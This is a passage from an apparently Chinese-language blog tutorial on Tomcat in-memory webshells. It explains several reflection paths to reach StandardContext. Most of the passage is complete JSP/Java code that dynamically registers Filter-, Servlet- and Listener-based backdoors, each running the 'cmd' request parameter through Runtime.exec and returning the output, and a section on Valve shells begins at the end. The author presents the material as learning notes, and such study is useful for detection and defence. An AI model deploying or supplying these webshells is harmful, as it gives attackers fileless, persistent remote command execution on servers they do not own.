class="comment">//接下来创建一个FilterDef开始添加Filter</span></span><br><span class="line">    FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    Field configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) configs.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;test&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参照了好几篇文章才勉强理解完,感谢这几篇文章的帮助</p>
<p><a href="https://blog.csdn.net/qq_41874930/article/details/121184952">https://blog.csdn.net/qq_41874930/article/details/121184952</a></p>
<p><a href="https://blog.csdn.net/angry_program/article/details/116661899?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165034810816780269864296%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165034810816780269864296&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-116661899.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=filter%E5%86%85%E5%AD%98%E9%A9%AC&spm=1018.2226.3001.4187">Filter内存马浅析</a></p>
<p><a href="https://blog.csdn.net/weixin_45682070/article/details/122930587?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165034810816780269864296%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165034810816780269864296&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122930587.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=filter%E5%86%85%E5%AD%98%E9%A9%AC&spm=1018.2226.3001.4187">tomcat Filter内存马</a></p>
<h3 id="获取standrandContext的方法"><a href="#获取standrandContext的方法" class="headerlink" title="获取standrandContext的方法"></a>获取standrandContext的方法</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>每加载一个Web应用就创建一个ServletContext对象来共享数据，Tomcat对ServletContext的实现为ApplicationContext，而ApplicationContext实例中包含StandardContext。那么StandardContext的获取思路大概为ServletContext-&gt;ApplicationContext-&gt;StandardContext。想要获取共享数据的对象ServletContext，先要获取携带数据的对象，例如request对象或ThreadLocal。二者有一点差异，request对象可以在不同线程内获取数据，而ThreadLocal只能在当前线程内获取数据。但是最终的ServletContext是唯一的，所以这两种获取方式理论上都可以采用。从应用范围上讲利用request对象更通用，但是如果无法直接获取request对象，可以从ThreadLocal入手</p>
<p><code>ApplicationContext</code>中有<code>StandardContext</code>类型的成员变量<code>context</code>,通过这样就能获取到对应的<code>context</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">//这里获取到的class是ApplicationContextFacade</span><br><span class="line">    appctx.setAccessible(true);</span><br><span class="line">        // ApplicationContext 为 ServletContext 的实现类</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    stdctx.setAccessible(true);</span><br><span class="line">        // standardContext为context接口标准实现类</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>

<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>除了上面那种方法,还在看大佬博客的时候发现了一个方法,这个方法很巧妙</p>
<p>首先</p>
<p>在jsp中可以直接写的request对象的类型是HttpServletRequest,HttpServletRequest是一个接口,通过它,getClass(),获取到当前正在运行的它的对应对象的类是RequestFacade</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420101423176.png" alt="image-20220420101423176"></p>
<p>RequestFacade中有一个成员变量Request</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420102024626.png" alt="image-20220420102024626"></p>
<p>通过该Request中的getContext()方法可以获取到当前request对应的context</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420101210413.png" alt="image-20220420101210413"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field declaredField = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Request request1 = (Request)declaredField.get(request);</span><br><span class="line">    StandardContext standardContext=(StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure>

<h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><p>通过ThreadLocal获取context</p>
<p>ThreadLocal是什么呢,顾名思义,就是它里面存的是当前线程才才可以访问和使用的一些变量,当然想用他里面的变量,也得先存进去不是</p>
<p>看大佬说的是因为在internalDoFilter方法调用中，将request赋值给了ThreadLocal。所以可以获取到request从而像方法二一样获取到context对象,但是这里就出现了一个令我有点不解的点,就是Filter的添加是在internalDoFilter之后,为什么可以在添加Filter之前就获取到ThreadLocal这个对象呢</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421121651249.png" alt="image-20220421121651249" style="zoom:67%;" />

<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421121832745.png" alt="image-20220421121832745"></p>
<p>当ApplicationDispatcher.WRAP_SAME_OBJECT这个变量为true的时候,就会创建新的ThreadLocal并且将request对象放进去,这个值默认为false,所以通过反射修改一下</p>
<p>这个方法学习的推进遇见了麻烦,完事补上…….</p>
<h4 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h4><p>通过<code>ContextClassLoader</code>获取<code>standardContext</code></p>
<p>ContextClassLoader实际上是一个虚的概念,它的本质还是ClassLoader,只是它破坏了双亲委托机制,让子类加载器可以加载父类加载器才能加载的内容</p>
<p>tomcat的类加载机制和双亲委派机制是相反它,它是先用webappClassLoader去尝试加载某个类,找不到再交给父类加载器去加载</p>
<p>webappClassLoader显然就是这样一个ContextClassLoader</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220421144335949.png" alt="image-20220421144335949"></p>
<p>采用<code>Thread.currentThread().getContextClassLoader()</code>获取到的CLassLoader是ParalleWebappClassLoader,它是<code>WebappClassLoaderBase</code>的子类,由于contextClassLoader的特性,它可以加载<code>WebappClassLoaderBase</code>的内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure>

<h4 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h4><p>通过Thread获取context</p>
<p>跟着这篇<a href="https://www.jianshu.com/p/e2774aa3e9ba">文章</a>学习,大概找context的路径是酱紫的</p>
<p>threads[16]-&gt;target-&gt;endpoint-&gt;handler-&gt;proto-&gt;adapter-&gt;connector-&gt;service-&gt;engine-&gt;children(map)-&gt;map(“localhost”)-&gt;StandardEngine-&gt;children(map)-&gt;map(‘’)-&gt;standardContext</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420180444920.png" alt="image-20220420180444920"></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420182450812.png" alt="image-20220420182450812"></p>
<p>总之知道在哪里可以获取到context后过程其实并不难,主要的是细心一层层往下慢慢剥开,还有个问题就是说有的成员变量是在父类中的,需要多次<code>getSuperclass()</code></p>
<p>通过这种方式实现的Filter内存马</p>
<blockquote>
<p>可能是由于反射的操作过于复杂了吧,idea在多个getSuperclass后并没有跟往常一样,在getDeclatedField的时候提示变量名,而且还没有提示filed找不到的异常需要处理,只是standardContext变量需要在一开始就定义好,不然后面就会判断该变量无法读取到</p>
</blockquote>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    StandardContext standardContext=<span class="keyword">null</span>;</span><br><span class="line">    ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();</span><br><span class="line">    Field field=threadGroup.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Thread[] threads=(Thread[])field.get(threadGroup);</span><br><span class="line">    <span class="keyword">for</span>(Thread thread:threads)&#123;</span><br><span class="line">        <span class="keyword">if</span>(thread!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//遍历线程数组,选出Acceptor的线程</span></span><br><span class="line">            String name = thread.getName();</span><br><span class="line">            System.out.println(name);</span><br><span class="line">            <span class="keyword">if</span>(thread.getName().contains(<span class="string">&quot;http&quot;</span>)&amp;&amp;thread.getName().contains(<span class="string">&quot;Acceptor&quot;</span>))&#123;</span><br><span class="line">                <span class="comment">//获取到对应的线程</span></span><br><span class="line">                Field targetField = thread.getClass().getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                targetField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Runnable target1 = (Runnable) targetField.get(thread);</span><br><span class="line"></span><br><span class="line">                Field endpointField = target1.getClass().getDeclaredField(<span class="string">&quot;endpoint&quot;</span>);</span><br><span class="line">                endpointField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object endpoint1 = endpointField.get(target1);</span><br><span class="line"></span><br><span class="line">                Field handlerField = endpoint1.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                handlerField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object handler1 = handlerField.get(endpoint1);</span><br><span class="line"></span><br><span class="line">                Field protoField = handler1.getClass().getDeclaredField(<span class="string">&quot;proto&quot;</span>);</span><br><span class="line">                protoField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object proto = protoField.get(handler1);</span><br><span class="line"></span><br><span class="line">                Field adapterField = proto.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;adapter&quot;</span>);</span><br><span class="line">                adapterField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object adapter = adapterField.get(proto);</span><br><span class="line"></span><br><span class="line">                Field connectorField = adapter.getClass().getDeclaredField(<span class="string">&quot;connector&quot;</span>);</span><br><span class="line">                connectorField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object connector = connectorField.get(adapter);</span><br><span class="line"></span><br><span class="line">                Field serviceField = connector.getClass().getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">                serviceField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object service = serviceField.get(connector);</span><br><span class="line"></span><br><span class="line">                Field engineField = service.getClass().getDeclaredField(<span class="string">&quot;engine&quot;</span>);</span><br><span class="line">                engineField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object engine = engineField.get(service);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                Field children1 = engine.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;children&quot;</span>);</span><br><span class="line">                children1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                <span class="comment">//这里得到的hashMap的entry 存的是域名和host的对应关系</span></span><br><span class="line">                HashMap engineMap = (HashMap) children1.get(engine);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//获取host</span></span><br><span class="line">                StandardHost standardHost=(StandardHost)engineMap.values().iterator().next();</span><br><span class="line"></span><br><span class="line">                Field declaredField = standardHost.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;children&quot;</span>);</span><br><span class="line">                declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                HashMap contextMap = (HashMap)declaredField.get(standardHost);</span><br><span class="line"></span><br><span class="line">               standardContext = (StandardContext)contextMap.values().iterator().next();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">            String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            StringBuffer res = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="comment">//加一个系统的判断</span></span><br><span class="line">            String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">            BufferedReader bufferedReader;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                isWin = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String len;</span><br><span class="line">                <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    res.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                res.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + res.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接下来创建一个FilterDef开始添加Filter</span></span><br><span class="line">    FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">//添加的是当前diepatcher类型的名字</span></span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    Field configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) configs.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;test&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h5 id="原理学习"><a href="#原理学习" class="headerlink" title="原理学习"></a>原理学习</h5><p>为什么可以通过Acceptor这个线程层层推进找到context呢,这就需要再学习一下了</p>
<p>由于对tomcat底层架构和java知识不足,只能先写点自己浅显的理解,之后了解足够之后再来补充</p>
<blockquote>
<p>个人理解</p>
</blockquote>
<p>在tomcat运行期间,肯定有很多线程被启动,他们都有各自要做的事情,Acceptor这个线程顾名思义,就是用来接收请求的线程,接收了请求,肯定是需要层层转发给engine-&gt;context-&gt;wrapper处理才行呢,那么这个线程中就肯定可以获取到context对象</p>
<h2 id="servlet类型的内存马"><a href="#servlet类型的内存马" class="headerlink" title="servlet类型的内存马"></a>servlet类型的内存马</h2><p>首先,跟进一些servlet的添加注册流程</p>
<p>首先在ContextConfig#webConfig()中读取xml文件信息</p>
<p>使用context#createWrapper新建一个wrapper对象,设置启动优先级,servlet的name,设置了servlet的Class</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420121557998.png" alt="image-20220420121557998"></p>
<p>并且通过addChild将其添加到context当中,</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420121642666.png" alt="image-20220420121642666"></p>
<p>然后循环遍历servletmapping添加路径和name的对应关系</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420122055271.png" alt="image-20220420122055271"></p>
<p>其实大体流程和之前的filter差不多</p>
<p>还变得简单了,原因呢就是wrapper和servlet是一一对应的关系</p>
<p>总共分为以下几步</p>
<p>1.获取到context并创建一个Wrapper对象</p>
<p>2.设置设置启动优先级,servlet的name,设置servlet对应的Class</p>
<p>3.将wrapper添加到context的children中</p>
<p>4.将路径和servlet做好映射</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Servlet servlet = <span class="keyword">new</span> Servlet()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">            String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            StringBuffer result = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            <span class="comment">//加一个系统的判断</span></span><br><span class="line">            String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">            BufferedReader bufferedReader;</span><br><span class="line">            <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                isWin = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String len;</span><br><span class="line">                <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    result.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                result.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + result.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    Class&lt;? extends HttpServletRequest&gt; aClass = request.getClass();</span><br><span class="line">    Field declaredField = aClass.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Request req=(Request) declaredField.get(request);</span><br><span class="line">    StandardContext standardContext=(StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line">    String name=servlet.getClass().getSimpleName();</span><br><span class="line">    Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setServlet(servlet);</span><br><span class="line">    wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line"></span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/servlet&quot;</span>,name);</span><br></pre></td></tr></table></figure>

<p>访问对应的jsp让其完成动态注入,接着就可以在对应路径执行命令了</p>
<h2 id="Listener型内存马"><a href="#Listener型内存马" class="headerlink" title="Listener型内存马"></a>Listener型内存马</h2><p>在Tomcat中,自定义了很多继承于EventListener接口的对象,应用于各个对象的监听</p>
<p>在继承了这个接口的对象中,有一个ServletRequestListener,它用于监听ServletRequest的生成和销毁,也就是说,只要访问该网站资源,就会触发requestInitialized方法</p>
<img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420140012800.png" alt="image-20220420140012800" style="zoom: 50%;" />

<p>在<code>StandardContext#fireRequestInitEvent</code>方法中,进行了对listener中初始化方法的调用</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220420140848773.png" alt="image-20220420140848773"></p>
<p>综上所述,只需要创建一个<code>ServletRequestListener</code>并且将其添加到<code>StandardContext</code>中的<code>ApplicationEventListeners</code>就行了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ServletRequestListener servletRequestListener = <span class="keyword">new</span> ServletRequestListener()&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        StringBuffer result = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="comment">//加一个系统的判断</span></span><br><span class="line">        String os = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> isWin = <span class="keyword">false</span>;</span><br><span class="line">        BufferedReader bufferedReader;</span><br><span class="line">        <span class="keyword">if</span> (os != <span class="keyword">null</span> &amp;&amp; os.toLowerCase().startsWith(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">            isWin = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (isWin == <span class="keyword">false</span>) &#123;</span><br><span class="line">                bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(<span class="string">&quot;cmd /C &quot;</span> + cmd).getInputStream()));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String len;</span><br><span class="line">            <span class="keyword">while</span> ((len = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                result.append(len + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            result.append(e.getMessage());</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            response.getWriter().print(<span class="string">&quot;&lt;pre&gt;&quot;</span> + result.toString() + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Field declaredField = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">declaredField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Request request1 = (Request)declaredField.get(request);</span><br><span class="line">StandardContext standardContext=(StandardContext) request1.getContext();</span><br><span class="line"></span><br><span class="line">standardContext.addApplicationEventListener(servletRequestListener);</span><br></pre></td></tr></table></figure>



<h2 id="Valve-阀门-内存马"><a href="#Valve-阀门-内存马" class="headerlink" title="Valve(阀门)内存马"></a>Valve(阀门)内存马</h2><p><a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html">tomcat管道与阀门原理讲解</a></p>
<p>Tomcat在处理一个请求调用逻辑的时候,传递Request和Response对象使用了职责链模式</p>
<p>Tomcat定义了两个接口Pipeline(管道)和Valve(阀门)</p>
<p>Pipeline接口的实现类是<code>StandardPipeline</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423172150621.png" alt="image-20220423172150621"></p>
<p>Valve一般直接使用其实现类ValveBase</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220423172202365.png" alt="image-20220423172202365"></p>
<p>Pipeline 中会有一个最基础的 Valve（basic），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。Pipeline 提供了 <code>addValve</code> 方法，可以添加新 Valve 在 基础Valve之前，并按照添加顺序执行。</p>
